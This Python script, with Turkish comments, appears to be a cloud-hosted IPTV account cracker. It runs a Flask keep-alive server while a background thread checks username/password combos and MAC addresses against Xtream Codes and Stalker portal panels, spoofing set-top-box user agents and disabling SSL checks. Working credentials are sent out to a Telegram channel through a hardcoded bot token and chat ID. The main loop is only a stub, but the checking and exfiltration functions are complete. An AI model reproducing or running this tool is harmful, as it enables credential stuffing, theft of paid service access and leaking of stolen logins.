import os
import time
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# SSL uyarılarını kapat
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from flask import Flask
app = Flask('')

@app.route('/')
def home():
    return "IPTV Bot Aktif ve 7/24 Bulutta Çalışıyor!"

# --- TELEGRAM AYARLARI (GÜNCELLENDİ) ---
TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
CHAT_ID = "-1003901042500"

def telegrama_gonder(mesaj):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
        print(f"[DEBUG] Telegram'a istek atılıyor... Chat ID: {CHAT_ID}")
        response = requests.post(url, data=data, timeout=10)
        print(f"[DEBUG] Telegram Yanıt Kodu: {response.status_code}")
        print(f"[DEBUG] Telegram Yanıt İçeriği: {response.text}")
    except Exception as e:
        print(f"[!] Telegram mesajı gönderilemedi (Kritik Hata): {e}")

def m3u_tara(panel, user, pas):
    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
    headers = {
        'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
        'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
    }
    try:
        res = requests.get(api_url, headers=headers, timeout=5, verify=False)
        if res.status_code == 200 and 'user_info' in res.text:
            if '"auth":1' in res.text or '"status":"Active"' in res.text:
                m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                mesaj = (
                    f"🟢 <b>M3U HİT BULUNDU! (Bulut)</b>\n"
                    f"🌐 <b>Panel:</b> http://{panel}\n"
                    f"👤 <b>User:</b> <code>{user}</code>\n"
                    f"🔑 <b>Pass:</b> <code>{pas}</code>\n"
                    f"🔗 <b>M3U:</b> {m3ulink}"
                )
                telegrama_gonder(mesaj)
                return True
    except:
        pass
    return False

def mac_tara(panel, mac):
    mac_url = f"http://{panel}/c/portal.imixs.com/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac}"
    headers = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
    try:
        res = requests.get(mac_url, headers=headers, timeout=5, verify=False)
        if res.status_code == 200 and ('js' in res.text or 'token' in res.text):
            mesaj = (
                f"🟢 <b>MAC HİT BULUNDU! (Bulut)</b>\n"
                f"🌐 <b>Panel:</b> http://{panel}\n"
                f"📺 <b>MAC:</b> <code>{mac}</code>"
            )
            telegrama_gonder(mesaj)
            return True
    except:
        pass
    return False

def arka_plan_tarayici():
    print("[*] Bulut Otonom Tarayıcı Başlatıldı...")
    time.sleep(3) # Sistem kendine gelsin diye minik bekleme
    
    # Başlangıç bildirimi
    telegrama_gonder("🚀 <b>Bulut Otonom Tarayıcı Başlatıldı ve Aktif!</b>\n⏳ Tarama döngüsü devrede.")
        
    paneller = ["ornekpanel.com:8080"] 
    combos = []
    maclar = []
    
    while True:
        try:
            print("[i] Tarama turu dönüyor...")
            time.sleep(1800) # 30 dk bekleme
        except Exception as e:
            print(f"[!] Hata: {e}")
            time.sleep(60)

if __name__ == '__main__':
    # Önce tarayıcıyı ayrı bir thread'de başlatıyoruz ki Flask'ı bloklamasın
    import threading
    t = threading.Thread(target=arka_plan_tarayici)
    t.daemon = True
    t.start()
    
    print("[*] Flask Web Sunucusu Başlatılıyor...")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
